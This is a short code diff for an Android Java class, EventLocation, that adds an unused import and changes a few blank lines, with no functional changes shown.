@@ -11,6 +11,8 @@ package com.android.service.event;
 
 import java.io.IOException;
 
+import android.R.bool;
+
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
@@ -48,6 +50,7 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 				Check.log(e);//$NON-NLS-1$
 			}
 		}
+		
 		locator = null;
 		
 		onExit(); // di sicurezza
@@ -84,5 +87,4 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 
 		return 0;
 	}
-
 }
